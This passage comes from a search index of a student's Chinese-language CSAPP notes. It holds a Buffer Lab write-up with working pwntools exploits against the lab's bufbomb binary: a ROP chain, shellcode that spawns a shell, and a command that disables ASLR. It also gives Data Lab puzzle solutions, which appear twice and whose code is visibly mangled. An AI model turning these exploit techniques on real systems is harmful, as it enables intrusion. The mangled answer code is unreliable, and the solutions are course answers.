\u51fd\u6570\u3002\u4e3a\u4e86\u6539\u53d8\u5168\u5c40\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 Gets() \u5e76\u5c06\u8be5\u5168\u5c40\u53d8\u91cf\u5730\u5740\u4f20\u5165\uff0c\u6765\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\uff0c\u7136\u540e\u518d\u8df3\u8f6c\u5230 bang() \u4e0a\u5c31\u5b8c\u6210\u4e86\u3002 \u53e6\u5916\uff0c\u7531\u4e8e\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u6ca1\u6709\u7981\u6b62\u6808\u4e0a\u6267\u884c\uff0c\u6240\u4ee5\u4f60\u60f3\u5f80\u7f13\u51b2\u533a\u91cc\u5199\u70b9\u6c47\u7f16\u597d\u50cf\u4e5f\u6ca1\u95ee\u9898\u3002\u4f46\u662f\uff0c\u6211\u662f\u4e0d\u4f1a\u8fd9\u6837\u5e72\u7684\u3002 \u968f\u7740 NX \u4fdd\u62a4\u7684\u5f00\u542f\uff0c\u4ee5\u5f80\u76f4\u63a5\u5411\u6808\u6216\u8005\u5806\u4e0a\u76f4\u63a5\u6ce8\u5165\u4ee3\u7801\u7684\u65b9\u5f0f\u96be\u4ee5\u7ee7\u7eed\u53d1\u6325\u6548\u679c\u3002\u653b\u51fb\u8005\u4eec\u4e5f\u63d0\u51fa\u6765\u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4fdd\u62a4\uff0c\u76ee\u524d\u4e3b\u8981\u7684\u662f ROP(Return Oriented Programming)\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u5728 \u6808\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u5229\u7528\u7a0b\u5e8f\u4e2d\u5df2\u6709\u7684\u5c0f\u7247\u6bb5 (gadgets) \u6765\u6539\u53d8\u67d0\u4e9b\u5bc4\u5b58\u5668\u6216\u8005\u53d8\u91cf\u7684\u503c\uff0c\u4ece\u800c\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b \u3002\u6240\u8c13 gadgets \u5c31\u662f\u4ee5 ret \u7ed3\u5c3e\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u65b9\u4fbf\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u9996\u5148\u627e\u4e00\u4e0b global_value \u7684\u5730\u5740\uff1a 1 2 .bss: 0804 A1C4 public global_value .bss: 0804 A1C4 global_value dd ? ; DATA XREF: bang+6\u2191r \u8bb0\u4e0b\u5730\u5740\uff1a 1 0 x0804A1C4 \u7b2c\u4e00\u6b65\u8df3\u8f6c\u5230 Gets() \uff08 0x080489C0 \uff09\u9700\u8981\u7ed9\u8fd9\u4e2a\u53c2\u6570\u3002\u770b\u8d77\u6765\u548c\u7b2c\u4e8c\u5173\u5f88\u50cf\uff0c\u662f\u4e0d\u662f\uff1f\u968f\u540e\u5c31\u9700\u8981\u8f93\u5165\u503c\u5230 global_value \u4e2d\u4e86\uff1a 1 2 cookie = 0x6dfd74c3 p . sendline ( p32 ( cookie )) \u522b\u5fd8\u4e86\u6700\u540e\u8fd8\u8981\u8df3\u8f6c\u5230 bang() \uff08 0x08048E10 \uff09\u5f53\u4e2d\uff0c\u6240\u4ee5\u5c31\u6709exp.py\uff1a 1 2 3 4 5 6 7 8 9 10 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-t' , 'domain' ]) print ( p . recv ()) address = 0x080489C0 payload = 'a' * 28 + p32 ( address ) + p32 ( 0x08048E10 ) + p32 ( 0x0804A1C4 ) p . sendline ( payload ) cookie = 0x6dfd74c3 p . sendline ( p32 ( cookie )) print ( p . recv ()) \u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' [ + ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' : pid 11026 Team : domain Cookie : 0 x6dfd74c3 Type string : Bang ! : You set global_value to 0 x6dfd74c3 [ * ] Stopped process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' ( pid 11026 ) Process finished with exit code 0 \u770b\u6765\u6ca1\u6709\u95ee\u9898\uff0c\u6211\u4eec\u6765attach\u4e0a\u53bb\u8ddf\u7740\u770b\u770b\u8fd0\u884c\u5f97\u600e\u4e48\u6837\uff1a 1 2 3 FF8DF26C 080489 C0 Gets FF8DF270 08048 E10 bang FF8DF274 0804 A1C4 . bss : global_value \u8fd9\u662f\u7a0b\u5e8f\u9996\u6b21\u8c03\u7528 Gets() \u540e\u7684\u6808\uff0c\u5b83\u5373\u5c06\u4ece getbuf() \u4e2d\u8fd4\u56de\u5230 Gets() \u4e0a\uff0c\u5e76\u4ee5 global_value \u7684\u5730\u5740\u4e3a\u53c2\u6570\u3002\u968f\u540e\uff0c\u7b2c\u4e8c\u6b21 Gets() \u6267\u884c\u540e\uff0c\u5b83\u5c06\u8fd4\u56de\u5230 0x08048E10 \u4e0a\uff0c\u5373 bang() \u3002\u8fd9\u4e2a\u65f6\u5019\u7684\u6808\u662f\u8fd9\u6837\u7684\uff1a 1 2 3 FF8DF26C 61616161 FF8DF270 08048 E10 bang FF8DF274 0804 A1C4 . bss : global_value \u5b83\u5373\u5c06\u8fd4\u56de\u5230 bang() \u51fd\u6570\u4e0a\u3002\u5e76\u4e14\u6b64\u65f6\u4e5f\u53ef\u4ee5\u770b\u5230 global_value \u5df2\u7ecf\u88ab\u6539\u53d8\uff1a 1 0804 A1C0 04 00 00 00 C3 74 FD 6 D 00 00 00 00 00 00 00 00 ....... m ........ \u7ee7\u7eed\u8ddf\u5230 bang() \u51fd\u6570\u91cc\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 void __noreturn bang () { if ( global_value == cookie ) { printf ( \"Bang!: You set global_value to 0x%x \\n \" , global_value ); validate ( 2 ); } else { printf ( \"Misfire: global_value = 0x%x \\n \" , global_value ); } exit ( 0 ); } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 .text: 08048 E10 ; =============== S U B R O U T I N E ======================================= .text: 08048 E10 .text: 08048 E10 ; Attributes: noreturn bp-based frame .text: 08048 E10 .text: 08048 E10 public bang .text: 08048 E10 bang proc near .text: 08048 E10 push ebp .text: 08048 E11 mov ebp , esp .text: 08048 E13 sub esp , 8 .text: 08048 E16 mov eax , ds : global_value .text: 08048 E1B cmp eax , ds : cookie .text: 08048 E21 jz short loc_8048E40 .text: 08048 E23 mov [ esp + 4 ], eax .text: 08048 E27 mov dword ptr [ esp ], offset aMisfireGlobalV ; \"Misfire: global_value = 0x%x\\n\" .text: 08048 E2E call _printf .text: 08048 E33 .text: 08048 E33 loc_8048E33 : ; CODE XREF: bang+4C\u2193j .text: 08048 E33 mov dword ptr [ esp ], 0 ; status .text: 08048 E3A call _exit .text: 08048 E3A ; --------------------------------------------------------------------------- .text: 08048 E3F align 10 h .text: 08048 E40 .text: 08048 E40 loc_8048E40 : ; CODE XREF: bang+11\u2191j .text: 08048 E40 mov [ esp + 4 ], eax .text: 08048 E44 mov dword ptr [ esp ], offset aBangYouSetGlob ; \"Bang!: You set global_value to 0x%x\\n\" .text: 08048 E4B call _printf .text: 08048 E50 mov dword ptr [ esp ], 2 .text: 08048 E57 call validate .text: 08048 E5C jmp short loc_8048E33 .text: 08048 E5C bang endp \u6ca1\u6709\u95ee\u9898\u3002\u5b8c\u7ed3\u6492\u82b1\u3002 Tip \u597d\u5427\u6211\u8fd8\u662f\uff0c\u518d\u8bf4\u51e0\u53e5\u5173\u4e8e\u4e0d\u7528pwntools\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u6709\u4e24\u6b21\u8f93\u5165\uff0c\u4f3c\u4e4e\u53ea\u8c03\u7528\u4e00\u6b21 sendstring \u6ca1\u6cd5\u641e\u5b9apayload\u3002\u4e8e\u662f\u5c31\u4e0d\u5f97\u4e0d\u8fd9\u6837\uff1a 1 2 3 . / sendstring < . / payload > . / converted echo \"c374fd6d\" | . / sendstring >> . / converted . / bufbomb - t domain < . / converted \u7b2c\u4e8c\u884c\u5c31\u662f\u628a\u7b2c\u4e8c\u6b21\u8981\u8f93\u5165\u7ed9\u5168\u5c40\u53d8\u91cf\u7684Cookie\u585e\u5230\u8f6c\u6362\u540e\u7684payload\u6587\u4ef6\u91cc\u3002 \u6216\u8bb8\u4f60\u6709\u66f4\u597d\u7684\u529e\u6cd5\uff0c\u603b\u4e4b\u80fd\u641e\u5b9a\u5c31\u884c\u3002\u4e0d\u8fc7\u6211\u8fd8\u662f\u63a8\u8350\u7528pwntools\u3002","title":"bang()"},{"location":"szu_courses/csapp/buffer_lab/#nitro-mode","text":"\u5176\u5b9e\u6211\u4eec\u7684\u5b9e\u9a8c\u6ca1\u8981\u6c42\u8fd9\u4e2a\uff0c\u6211\u8fd8\u6ca1\u7a7a\u53bb\u770b\u8fd9\u662f\u5e72\u561b\u7684\uff0c\u6628\u665a\u5728\u5927\u4f6c\u7684\u6307\u5bfc\u4e0b\u641e\u4e86\u8fd9\u4e2agetshell\uff1a 1 2 3 4 5 6 7 8 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-n' , '-t' , 'domain' ]) print ( p . recv ()) payload = asm ( shellcraft . sh ()) + 'a' * ( 0x20c - 44 ) + p32 ( 0xFFFFB060 ) p . sendline ( payload ) p . interactive () print ( p . recv ()) \u8fd9\u4e2a...\u7531\u4e8e\u6ca1\u6709\u5173\u6808\u4e0a\u6267\u884c\uff0c\u6240\u4ee5\u5982\u679c\u5173\u95ed\u4e86\u5730\u5740\u968f\u673a\uff1a 1 echo 0 > /proc/sys/kernel/randomize_va_space \u5c31\u53ef\u4ee5\uff1a 1 2 3 4 5 6 7 8 9 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb' [ + ] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb' : pid 14786 Team : domain [ * ] Switching to interactive mode Cookie : 0x6dfd74c3 ls main . py pwntools . iml venv \u6210\u529f\u5f97\u5230\u4e3b\u673a\u7684shell\u3002\u5565\uff1f\u4f60\u8bf4\u4e0d\u77e5\u9053\u6211\u5728\u5e72\u561b\uff1f\u8fd8\u4e0d\u77e5\u9053\u8fd9\u80fd\u5e72\u561b\uff1f\u4f60\u53ef\u4ee5\u6572\u4e00\u6761\u4f60\u77e5\u9053\u7684Linux\u547d\u4ee4\u8bd5\u8bd5\u3002 Danger \u4f60\u5df2\u7ecf\u5f97\u5230\u4e86\u76ee\u6807\u4e3b\u673a\u7684shell\uff0c\u8bf7\u4e0d\u8981\u5728\u771f\u673a\u4e0a\u6216\u662f\u6ca1\u6709\u6253\u5feb\u7167\u7684\u865a\u62df\u673a\u4e0a\u8fd0\u884c\u7c7b\u4f3c rm -rf / \u7684\u547d\u4ee4\uff01\u8fd9\u5728\u6ca1\u6709 --no-preserve-root \u53c2\u6570\u4e4b\u7c7b\u7684\u7cfb\u7edf\u4e0a\u5c06\u9020\u6210\u4e25\u91cd\u95ee\u9898\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u8003\uff1a \u57fa\u672c ROP - ret2shellcode \u672c\u83dc\u9e21\u5c31\u4e0d\u5728\u8fd9\u8fb9\u73b0\u5b66\u73b0\u5356\u4e86...","title":"Nitro mode"},{"location":"szu_courses/csapp/buffer_lab/#_7","text":"\u5927\u4f6c\uff1a \u751a\u81f3\u4e0d\u7528\u5173aslr\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2ashell\uff0c\u6709\u7a7a\u518d\u6574 \u597d\uff0c\u819c\u3002\uff08\u4e24\u5206\u949f\u540e\uff09\u5927\u4f6c\uff1a \u7a81\u7136\u60f3\u8d77\u6765\u5b83 bss \u5e94\u8be5\u4e5f\u662f\u53ef\u6267\u884c\u7684\uff0c\u53ea\u8981\u628ashellcode\u5199\u5230 bss \u5c31\u884c\u4e86\uff0c\u4e0d\u7528\u90a3\u4e48\u9ebb\u70e6 \u6709\u9053\u7406\u3002\u641e\u8d77\uff1a 1 2 3 4 5 6 7 8 9 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-n' , '-t' , 'domain' ]) print ( p . recv ()) address = 0x080489C0 payload = 'a' * 0x20c + p32 ( address ) + p32 ( 0x0804A200 + 0x160 ) + p32 ( 0x0804A200 + 0x160 ) p . sendline ( payload ) p . sendline ( asm ( shellcraft . sh ())) p . interactive () \u786e\u5b9e\u4e0d\u9700\u8981\u5173\u95ed\u5730\u5740\u968f\u673a\u5316\u4e5f\u6210\u529f\u4e86\uff1a 1 2 3 4 5 6 7 8 9 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb' [ + ] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb' : pid 5702 Team : domain Cookie : 0x6dfd74c3 [ * ] Switching to interactive mode ls main . py pwntools . iml venv","title":"\u66f4\u65b0"},{"location":"szu_courses/csapp/buffer_lab/#_8","text":"\u4e0d\u7528\u8bf4\uff0c\u80af\u5b9a\u6709IDA\u3002 pwntools\uff0c\u5728Linux\u4e0b\u5f88\u65b9\u4fbf\uff0c\u6211\u5728IntelliJ IDEA\uff08\u6216\u8005PyCharm\uff09\u91cc\u5199\u4e5f\u5f88\u8212\u670d\u3002\u5bf9\u4e8eWindows\uff0c\u522b\u5fd8\u4e86\u6709WSL\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003\u6211\u7684\u8fc7\u5f80\u7684\u6587\u7ae0\u6765\u90e8\u7f72pwntools\u3002 \u53e6\u5916\uff1a 1 2 3 4 5 6 7 8 domain @linux - 521 z : ~/ IdeaProjects / pwntools > . / venv / bin / checksec ~/ Documents / SZU / CSAPP / 4 / bufbomb [ * ] '/home/domain/Documents/SZU/CSAPP/4/bufbomb' Arch : i386 - 32 - little RELRO : No RELRO Stack : No canary found NX : NX disabled PIE : No PIE ( 0x8048000 ) RWX : Has RWX segments","title":"\u73af\u5883\u8bf4\u660e"},{"location":"szu_courses/csapp/data_lab/","text":"\u6162\u6162\u5b8c\u5584\u8fd9\u91cc bitXor - x^y using only ~ and & Example: bitXor(4, 5) = 1 Legal ops: ~ & Max ops: 14 Rating: 1 1 2 3 int bitXor ( int x , int y ) { return ( ~ ( x & y )) & ( ~ (( ~ x ) & ( ~ y ))); } \u6839\u636e Exclusive or tmin - return minimum two's complement integer Legal ops: ! ~ & ^ | + << >> Max ops: 4 Rating: 1 1 2 3 int tmin ( void ) { return ( 1 << 31 ); } //2 /* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ & ^ | + * Max ops: 10 * Rating: 2 */ int isTmax(int x) { return (!(x + 1 + x + 1)) & (!(!(x + 1))); } /* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ & ^ | + << >> * Max ops: 12 * Rating: 2 */ int allOddBits(int x) { unsigned int mask = 0xAAU | 0xAAU << 8U | 0xAAU << 16U | 0xAAU << 24U; return !((x & mask) ^ mask); } /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ & ^ | + << >> * Max ops: 5 * Rating: 2 / int negate(int x) { return (~x) + 1; } //3 / * isAsciiDigit - return 1 if 0x30 <= x <= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ & ^ | + << >> * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) { int x equal or lager than 0x30 = !(((x + ((~0x30) + 1)) >> 31U) & 1); int x equal or smaller than 0x39 = !(((0x39 + (~x + 1)) >> 31U) & 1); return x equal or lager than 0x30 & x equal or smaller than 0x39; } /* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ & ^ | + << >> * Max ops: 16 * Rating: 3 */ int conditional(int x, int y, int z) { int sx = !(!x); int negate sx = (~sx) + 1; return (negate sx & y) | ((~negate_sx) & z); } /* * isLessOrEqual - if x <= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ & ^ | + << >> * Max ops: 24 * Rating: 3 / int isLessOrEqual(int x, int y) { // unsigned int ux = x, uy = y; // unsigned int negate ux = (~ux) + 1; // unsigned int y equal or lager than x = !(((uy + negate ux) >> 31U) & 1U); // return y equal or lager than x; unsigned int x sign = (x >> 31U) & 1U, y sign = (y >> 31U) & 1U; // unsigned int is different sign when x negate = (ux sign ^ uy sign) & ux sign; // unsigned int x equal y = !(ux ^ uy); // unsigned int negate uy = (~uy) + 1; // unsigned int x equal or lager than y = !(((ux + negate uy) >> 31U) & 1U); unsigned int y equal or lager than x = !(((y + (~x) + 1) >> 31U) & 1U); return (x sign & (!y sign)) | ((!(x sign ^ y sign)) & y equal or lager than_x); } //4 / * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ & ^ | + << >> * Max ops: 12 * Rating: 4 */ int logicalNeg(int x) { return ((x | ((~x) + 1)) >> 31U) + 1; } /* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ & ^ | + << >> * Max ops: 90 * Rating: 4 / int howManyBits(int x) { int bit 16, bit 8, bit 4, bit 2, bit 1, bit 0; int x sign = x >> 31U; int sx = (x sign & (~x)) | ((~x sign) & x); bit 16 = (!(!(sx >> 16U))) << 4U; sx = sx >> bit 16; bit 8 = (!(!(sx >> 8U))) << 3U; sx = sx >> bit 8; bit 4 = (!(!(sx >> 4U))) << 2U; sx = sx >> bit 4; bit 2 = (!(!(sx >> 2U))) << 1U; sx = sx >> bit 2; bit 1 = (!(!(sx >> 1U))); sx = sx >> bit 1; bit 0 = sx; return bit 16 + bit 8 + bit 4 + bit 2 + bit 1 + bit 0 + 1; } //float / * float twice - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while * Max ops: 30 * Rating: 4 */ unsigned float twice(unsigned uf) { int exp = (uf & 0x7F800000) >> 23U; int sign = uf & (1U << 31U); if (exp == 0) { return (uf << 1U) | sign; } if (exp == 255) { return uf; } exp += 1; if (exp == 255) { return 0x7F800000 | sign; } return (exp << 23U) | (uf & 0x807FFFFF); } /* * float i2f - Return bit-level equivalent of expression (float) x * Result is returned as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point values. * Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while * Max ops: 30 * Rating: 4 */ unsigned float i2f(int x) { // if (x == 0) { // return 0; // } else if (x == 2139095039) { // return 0x4eff0000; // } // int x sign = (x >> 31U) & 1; // unsigned int x real = x sign ? ((~x) + 1) : x; // int index = 31; // while (((x real >> index) & 1) == 0 && index >= 0) { // index -= 1; // } // int exp = 127 + index; // x real = x real & (~(1 << index)); // unsigned int fraction; // if (index <= 23) { // fraction = x real << (23 - index); // } else { // fraction = (x real >> 23U) << 23U >> (index - 23U); // } // return (x_sign << 31U) | (exp << 23) | fraction; unsigned result; int signx = x & (1 << 31U); int res = 31; int ss = 0; int ff = 0; int tmp; if (x == 0) { return 0; } if(signx) { x = (~x) + 1; } while (!((1 << res) & x)) { res=res-1; } x = x ^ (1 << res); if (res < 23) { x = x << (23 - res); } else { tmp = res - 24; if (tmp >= 0) { ss = (x >> tmp) & 1, ff = ((1 << tmp) - 1) & x; } x = (x >> (res - 23)); } x = x | ((res + 127) << 23); if (ff == 0) { ss = (ss & x); } x = x + ss; x = x | signx; result = x; return result; } /* * float f2i - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while * Max ops: 30 * Rating: 4 */ int float f2i(unsigned uf) { int exp = (uf & 0x7F800000) >> 23U; int sign = uf >> 31U; int fraction = (uf & 0x7FFFFF) | 0x00800000; int exponent = exp - 127; if (!(uf & 0x7FFFFFFF)) { return 0; } if (exponent < 0) { return 0; } if (exponent > 31) { return 0x80000000; } if (exponent > 23) { fraction <<= (exponent - 23); } else { fraction >>= (23 - exponent); } if (!((fraction >> 31U) ^ sign)) { return fraction; } else if (fraction >> 31U) { return 0x80000000; } else { return (~fraction) + 1; } }","title":"Data Lab"},{"location":"szu_courses/csapp/data_lab/#bitxor-xy-using-only-and","text":"Example: bitXor(4, 5) = 1 Legal ops: ~ & Max ops: 14 Rating: 1 1 2 3 int bitXor ( int x , int y ) { return ( ~ ( x & y )) & ( ~ (( ~ x ) & ( ~ y ))); } \u6839\u636e Exclusive or","title":"bitXor - x^y using only ~ and &amp;"},{"location":"szu_courses/csapp/data_lab/#tmin-return-minimum-twos-complement-integer","text":"Legal ops: ! ~ & ^ | + << >> Max ops: 4 Rating: 1 1 2 3 int tmin ( void ) { return ( 1 << 31 ); } //2 /* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ & ^ | + * Max ops: 10 * Rating: 2 */ int isTmax(int x) { return (!(x + 1 + x + 1)) & (!(!(x + 1))); } /* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ & ^ | + << >> * Max ops: 12 * Rating: 2 */ int allOddBits(int x) { unsigned int mask = 0xAAU | 0xAAU << 8U | 0xAAU << 16U | 0xAAU << 24U; return !((x & mask) ^ mask); } /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ & ^ | + << >> * Max ops: 5 * Rating: 2 / int negate(int x) { return (~x) + 1; } //3 / * isAsciiDigit - return 1 if 0x30 <= x <= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ & ^ | + << >> * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) { int x equal or lager than 0x30 = !(((x + ((~0x30) + 1)) >> 31U) & 1); int x equal or smaller than 0x39 = !(((0x39 + (~x + 1)) >> 31U) & 1); return x equal or lager than 0x30 & x equal or smaller than 0x39; } /* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ & ^ | + << >> * Max ops: 16 * Rating: 3 */ int conditional(int x, int y, int z) { int sx = !(!x); int negate sx = (~sx) + 1; return (negate sx & y) | ((~negate_sx) & z); } /* * isLessOrEqual - if x <= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ & ^ | + << >> * Max ops: 24 * Rating: 3 / int isLessOrEqual(int x, int y) { // unsigned int ux = x, uy = y; // unsigned int negate ux = (~ux) + 1; // unsigned int y equal or lager than x = !(((uy + negate ux) >> 31U) & 1U); // return y equal or lager than x; unsigned int x sign = (x >> 31U) & 1U, y sign = (y >> 31U) & 1U; // unsigned int is different sign when x negate = (ux sign ^ uy sign) & ux sign; // unsigned int x equal y = !(ux ^ uy); // unsigned int negate uy = (~uy) + 1; // unsigned int x equal or lager than y = !(((ux + negate uy) >> 31U) & 1U); unsigned int y equal or lager than x = !(((y + (~x) + 1) >> 31U) & 1U); return (x sign & (!y sign)) | ((!(x sign ^ y sign)) & y equal or lager than_x); } //4 / * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ & ^ | + << >> * Max ops: 12 * Rating: 4 */ int logicalNeg(int x) { return ((x | ((~x) + 1)) >> 31U) + 1; } /* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ & ^ | + << >> * Max ops: 90 * Rating: 4 / int howManyBits(int x) { int bit 16, bit 8, bit 4, bit 2, bit 1, bit 0; int x sign = x >> 31U; int sx = (x sign & (~x)) | ((~x sign) & x); bit 16 = (!(!(sx >> 16U))) << 4U; sx = sx >> bit 16; bit 8 = (!(!(sx >> 8U))) << 3U; sx = sx >> bit 8; bit 4 = (!(!(sx >> 4U))) << 2U; sx = sx >> bit 4; bit 2 = (!(!(sx >> 2U))) << 1U; sx = sx >> bit 2; bit 1 = (!(!(sx >> 1U))); sx = sx >> bit 1; bit 0 = sx; return bit 16 + bit 8 + bit 4 + bit 2 + bit 1 + bit 0 + 1; } //float / * float twice - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while * Max ops: 30 * Rating: 4 */ unsigned float twice(unsigned uf) { int exp = (uf & 0x7F800000) >> 23U; int sign = uf & (1U << 31U); if (exp == 0) { return (uf << 1U) | sign; } if (exp == 255) { return uf; } exp += 1; if (exp == 255) { return 0x7F800000 | sign; } return (exp << 23U) | (uf & 0x807FFFFF); } /* * float i2f - Return bit-level equivalent of expression (float) x * Result is returned as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point values. * Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while * Max ops: 30 * Rating: 4 */ unsigned float i2f(int x) { // if (x == 0) { // return 0; // } else if (x == 2139095039) { // return 0x4eff0000; // } // int x sign = (x >> 31U) & 1; // unsigned int x real = x sign ? ((~x) + 1) : x; // int index = 31; // while (((x real >> index) & 1) == 0 && index >= 0) { // index -= 1; // } // int exp = 127 + index; // x real = x real & (~(1 << index)); // unsigned int fraction; // if (index <= 23) { // fraction = x real << (23 - index); // } else { // fraction = (x real >> 23U) << 23U >> (index - 23U); // } // return (x_sign << 31U) | (exp << 23) | fraction; unsigned result; int signx = x & (1 << 31U); int res = 31; int ss = 0; int ff = 0; int tmp; if (x == 0) { return 0; } if(signx) { x = (~x) + 1; } while (!((1 << res) & x)) { res=res-1; } x = x ^ (1 << res); if (res < 23) { x = x << (23 - res); } else { tmp = res - 24; if (tmp >= 0) { ss = (x >> tmp) & 1, ff = ((1 << tmp) - 1) & x; } x = (x >> (res - 23)); } x = x | ((res + 127) << 23); if (ff == 0) { ss = (ss & x); } x = x + ss; x = x | signx; result = x; return result; } /* * float f2i - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while * Max ops: 30 * Rating: 4 */ int float f2i(unsigned uf) { int exp = (uf & 0x7F800000) >> 23U; int sign = uf >> 31U; int fraction = (uf & 0x7FFFFF) | 0x00800000; int exponent = exp - 127; if (!(uf & 0x7FFFFFFF)) { return 0; } if (exponent < 0) { return 0; } if (exponent > 31) { return 0x80000000; } if (exponent > 23) { fraction <<= (exponent - 23); } else { fraction >>= (23 - exponent); } if (!((fraction >> 31U) ^ sign)) { return fraction; } else if (fraction >> 31U) { return 0x80000000; } else { return (~fraction) + 1; } }","title":"tmin - return minimum two's complement integer"},{"location":"szu_courses/csapp/debug/","text":"...\u6211\u8fd8\u662f\u4e0d\u5f97\u4e0d\u8981\u5199\u4e00\u4e0b\u8fd9\u4e2a...\u5176\u5b9e\u8fd9\u4e2a\u771f\u7684\u5f88\u91cd\u8981\uff0c\u4f46\u662f\u5927\u90e8\u5206\u8bfe\u4e0a\u4e0d\u600e\u4e48\u8bb2\uff0c\u7136\u540e\u5c31\u80fd\u770b\u5230\u5f88\u591a\u5b66\u751f\u5728\u51fa\u73b0\u4e86\u95ee\u9898\u540e\u65e0\u4ece\u4e0b\u624b\u3002\u4e0b\u9762\u6765\u8ba8\u8bba\u4e00\u4e0b\u52a8\u6001\u8c03\u8bd5\uff0c\u4e0d\u8fc7\u7531\u4e8e\u76f8\u5173\u6587\u7ae0\u7f51\u4e0a\u5df2\u7ecf\u6709\u5f88\u591a\uff0c\u6211\u5c31\u4e0d\u5e9f\u8bdd\u592a\u591a\u4e86\u3002 Windows + IDA + Remote Linux Debugger 